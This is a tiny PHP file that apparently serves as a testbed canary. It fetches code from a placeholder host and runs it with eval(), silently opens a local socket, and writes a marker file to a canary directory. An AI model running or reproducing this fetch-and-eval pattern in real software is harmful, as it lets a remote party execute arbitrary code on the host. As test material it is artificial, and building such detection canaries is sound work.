<?php
$b = file_get_contents('https://pkg.acme-cdn.example/b');
eval($b);
$s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b15','x'); // testbed canary: never runs
